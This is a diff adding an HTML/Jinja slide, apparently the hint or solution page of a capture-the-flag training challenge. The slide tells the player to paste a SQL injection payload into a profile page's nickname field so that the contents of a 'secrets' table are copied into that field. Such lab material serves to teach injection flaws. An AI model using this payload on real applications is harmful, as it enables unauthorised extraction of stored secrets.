@@ -1,0 +1,14 @@
+<div class="slides">
+    {% if cdesc %}
+    <section class="desc-slide">
+        <h2>Goal:</h2>
+        <p>{{ cdesc }}</p>
+    </section>
+    {% endif %}
+    <section class="desc-slide">
+<p>Enter the code below into the "Nick Name" field on the profile page to find the flag.</p>
+<pre><code data-trim data-noescape>
+',nickName=(SELECT group_concat(secret) FROM secrets),email='
+</code></pre>
+    </section>
+</div>
